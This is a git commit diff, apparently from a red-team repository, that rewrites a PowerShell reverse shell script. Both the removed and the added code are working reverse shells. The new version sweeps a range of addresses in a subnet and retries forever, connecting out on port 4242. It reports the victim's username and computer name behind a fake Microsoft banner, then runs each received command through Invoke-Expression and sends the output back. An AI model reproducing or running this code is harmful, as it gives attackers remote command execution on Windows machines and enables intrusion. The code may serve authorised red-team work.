3919f099a6a492d175a0436091f61372a231c37c
TacticalTimbz <orlandoyeo@gmail.com>
2024-11-25 23:24:13 -0500

    updated website and reverse shell

--- RedTeam/Windows/Scripts/Rotating-ReverseShell.ps1
+++ RedTeam/Windows/Scripts/Rotating-ReverseShell.ps1
@@ -3,7 +3,8 @@
 
 [CmdletBinding()]
 [Parameter()]
-[string]$SampleAddress = "172.16.128.1"
+[string]$SampleAddress = "172.16.128.1",
+[int32]$Port
 
 $joinedOctets = ($SampleAddress.Split(".") | Select-Object -SkipLast 1) -join "."
 $IPs = @(5..240) 
@@ -15,60 +16,69 @@ foreach ($ip in $IPs){
     $usableIPs += $newIP
 }
 
-Write-Host $usableIPs
 
+# Function from:
+# http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+# https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+# https://github.com/samratashok/nishang
 
-function Invoke-ReverseShell {
-    [CmdletBinding()]
-    [Parameter()]
-    [string]$IPAddress,
-    [Parameter()]
-    [string]$Port = "8888"
+function Invoke-PowerShellTcp {      
+    [CmdletBinding()] 
+    Param(
+        [Int32]$Port,
+        [Parameter()]
+        [Switch]$Bind,
+        [Parameter()]
+        [System.Array]$IPs
+    )
+    While($true){
+        foreach ($ip in $IPs) {
+            $client = New-Object System.Net.Sockets.TcpClient
+            $connectionAttempt = $client.ConnectAsync($ip, $Port).Wait(1000)
+            if ($connectionAttempt -eq $true) {
+                try {
+                    $stream = $client.GetStream()
+                    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 } 
 
-    do {
-        # Delay before establishing network connection, and between retries
-        Start-Sleep -Seconds 1
-    
-        # Connect to C2
-        try{
-            $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, $Port)
-        } catch {}
-    } until ($TCPClient.Connected)
-    
-    $NetworkStream = $TCPClient.GetStream()
-    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
-    
-    # Writes a string to C2
-    function WriteToStream ($String) {
-        # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
-        [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
-    
-        # Write to C2
-        $StreamWriter.Write($String + 'SHELL> ')
-        $StreamWriter.Flush()
-    }
-    
-    # Initial output to C2. The function also creates the inital empty byte array buffer used below.
-    WriteToStream ''
-    
-    # Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
-    while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
-        # Encode command, remove last byte/newline
-        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-        
-        # Execute command and save output (including errors thrown)
-        $Output = try {
-                Invoke-Expression $Command 2>&1 | Out-String
-            } catch {
-                $_ | Out-String
+                    #Send back current username and computername
+                    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+                    $stream.Write($sendbytes, 0, $sendbytes.Length)
+
+                    #Show an interactive PowerShell prompt
+                    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+                    $stream.Write($sendbytes,0,$sendbytes.Length)
+
+                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+                        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+                        $data = $EncodedText.GetString($bytes,0, $i)
+                        try {
+                            #Execute the command on the target.
+                            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+                        }
+                        catch {
+                            Write-Warning "Something went wrong with execution of command on the target." 
+                            Write-Error $_
+                        }
+                        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+                        $x = ($error[0] | Out-String)
+                        $error.clear()
+                        $sendback2 = $sendback2 + $x
+
+                        #Return the results
+                        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+                        $stream.Write($sendbyte,0,$sendbyte.Length)
+                        $stream.Flush()  
+                    }
+                    $client.Close()
+                }
+                catch {
+                    Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+                    Write-Error $_
+                }
             }
-    
-        # Write output to C2
-        WriteToStream ($Output)
+        }
     }
-    # Closes the StreamWriter and the underlying TCPClient
-    $StreamWriter.Close()
 }
 
-$test = Invoke-ReverseShell -IPAddress "172.16.128.105"
-Write-Host $test
+
+Invoke-PowerShellTcp -Port 4242 -IPs $usableIPs
